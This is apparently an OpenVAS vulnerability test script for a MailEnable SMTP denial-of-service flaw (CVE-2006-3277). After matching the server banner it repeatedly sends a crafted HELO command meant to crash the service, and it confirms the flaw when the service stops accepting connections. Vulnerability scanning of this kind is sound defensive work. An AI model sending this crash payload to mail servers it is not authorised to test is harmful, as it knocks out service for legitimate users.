###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mailenable_smtp_helo_cmd_dos.nasl 13467 2019-02-05 12:16:48Z cfischer $
#
# MailEnable SMTP HELO Command Denial of Service Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802914");
  script_version("$Revision: 13467 $");
  script_cve_id("CVE-2006-3277");
  script_bugtraq_id(18630);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-05 13:16:48 +0100 (Tue, 05 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-07-12 17:17:25 +0530 (Thu, 12 Jul 2012)");
  script_name("MailEnable SMTP HELO Command Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("SMTP problems");
  script_dependencies("smtpserver_detect.nasl");
  script_mandatory_keys("smtp/mailenable/detected");

  script_xref(name:"URL", value:"http://www.mailenable.com/");
  script_xref(name:"URL", value:"http://secunia.com/advisories/20790");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1016376");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/27387");
  script_xref(name:"URL", value:"http://www.mailenable.com/hotfix/default.asp");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to crash the service
  by sending HELO command with specially crafted arguments.");

  script_tag(name:"affected", value:"MailEnable Standard version 1.92 and prior

  MailEnable Enterprise version 2.0 and prior

  MailEnable Professional version 2.0 and prior.");

  script_tag(name:"insight", value:"MailEnable SMTP service fails to handle the HELO command. This can be
  exploited to crash the service via a HELO command with specially crafted arguments.");

  script_tag(name:"solution", value:"Upgrade MailEnable version 6 or later.");

  script_tag(name:"summary", value:"This host is running MailEnable and is prone to denial of service
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("smtp_func.inc");

port = get_smtp_port(default:25);
banner = get_smtp_banner(port:port);
if(!banner || ! egrep(pattern:"Mail(Enable| Enable SMTP) Service", string:banner))
  exit(0);

data = 'HELO \0x41\r\n';

for(i = 1; i<= 100; i++) {

  soc = open_sock_tcp(port);
  if(soc) {
    j = 0;
    send(socket:soc, data:data);
    close(soc);
  } else {
    sleep(1);
    ## if it fails to connect 3 consecutive times.
    if(++j > 2) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);